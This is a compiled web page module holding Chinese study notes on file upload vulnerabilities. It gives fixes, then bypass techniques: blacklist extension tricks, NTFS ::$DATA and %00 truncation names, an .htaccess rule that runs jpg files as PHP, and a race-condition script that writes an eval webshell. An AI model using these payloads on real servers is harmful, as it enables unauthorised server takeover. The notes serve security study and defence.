import{_ as n}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as s,c as a,e}from"./app.a5c8fdbc.js";const p={},t=e(`<h2 id="漏洞概述" tabindex="-1"><a class="header-anchor" href="#漏洞概述" aria-hidden="true">#</a> 漏洞概述</h2><p>任意文件上传漏洞是因为对上传的文件校验不严导致攻击者上传可执行脚本接管服务器。</p><p>校验方法主要分客户端校验（前端）和服务端校验。</p><div class="custom-container tip"><p class="custom-container-title">修复方案</p><p>1）在将文件保存在本地前就进行相应的安全检查</p><p>2）使用白名单限制文件扩展名</p><p>3）对上传后的文件统一随机命名，不允许用户控制扩展名</p><p>4）上传文件的存储目录禁用执行权限</p></div><h2 id="客户端检验" tabindex="-1"><a class="header-anchor" href="#客户端检验" aria-hidden="true">#</a> 客户端检验</h2><h4 id="检测" tabindex="-1"><a class="header-anchor" href="#检测" aria-hidden="true">#</a> 检测</h4><p>Javascript校验后缀名（一般只校验后缀名）</p><h4 id="绕过" tabindex="-1"><a class="header-anchor" href="#绕过" aria-hidden="true">#</a> 绕过</h4><p>开启Burp抓包，点击浏览选择文件，但是还没点击&quot;上传&quot;，就弹出警告框，说明流量没经过Burp代理</p><p>所以非常可能是客户端JavaScript检测，直接把木马改成<code>.jpg</code>后缀上传，BurpSuite拦包修改后缀名</p><h2 id="服务端校验" tabindex="-1"><a class="header-anchor" href="#服务端校验" aria-hidden="true">#</a> 服务端校验</h2><h4 id="检测-1" tabindex="-1"><a class="header-anchor" href="#检测-1" aria-hidden="true">#</a> 检测</h4><p>1）MIME检测 文件头content-type字段校验（image/gif）</p><p>2）文件内容头校验（GIF89a）</p><p>3）文件扩展名校验 (黑名单、白名单)</p><p>4）文件内容检测 (检测内容是否合法或含有恶意代码)</p><h4 id="绕过-1" tabindex="-1"><a class="header-anchor" href="#绕过-1" aria-hidden="true">#</a> 绕过</h4><p>1）针对前两种检测，直接上传正常图片把木马内容粘贴在图片后边，修改扩展名后缀上传即可</p><p>2）文件扩展名黑名单检测绕过</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#漏网之鱼</span>
.cer、.php3、.php4

<span class="token comment">#大小写绕过</span>
.AsP
.pHP

<span class="token comment">#后缀复写</span>
.phphpp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>上传不符合windows文件命名规则的文件名</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>test.php:1.jpg
test.php::<span class="token variable">$DATA</span>
<span class="token comment">#会被windows系统自动去掉不符合规则符号后面的内容</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>3）文件扩展名白名单绕过</p><p>%00截断</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>PHP<span class="token operator">&lt;</span><span class="token number">5.3</span>.4时 shell.php%00.jpg 可截断%00后的内容
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务器中间件解析漏洞绕过</p><p>如果可上传修改 <code>.htaccess</code> 文件 (还能用于隐藏后门)</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token operator">&lt;</span>FilesMatch <span class="token string">&quot;shell.jpg&quot;</span><span class="token operator">&gt;</span>
SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php
<span class="token operator">&lt;</span><span class="token operator">/</span>FilesMatch<span class="token operator">&gt;</span>
<span class="token comment">//上传shell.jpg文件，将解析为php运行</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="竞争条件攻击" tabindex="-1"><a class="header-anchor" href="#竞争条件攻击" aria-hidden="true">#</a> 竞争条件攻击</h2><p>一些网站允许上传任意文件，然后检测文件是否包含<code>Webshell</code>，如果有则删除该文件。</p><p>服务器端在处理不同用户的请求时是并发进行的。</p><p>如果并发处理不当或相关操作逻辑顺序设计的不合理时，将导致条件竞争漏洞。</p><p>如这样一段代码</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;src&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;src&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;dst&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;dst&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>它先把文件保存在本地，再检查，然后删除；</p><p>在上传完成和安全检查删除它的间隙，攻击者用多线程不断的发起访问请求该文件，该文件就会被执行从而生成一个恶意shell。</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>//create_shell.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;../shell.php&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;w&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;&lt;?php @eval($_POST[1]) ?&gt;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,37),i=[t];function l(c,o){return s(),a("div",null,i)}const u=n(p,[["render",l],["__file","文件上传漏洞.html.vue"]]);export{u as default};
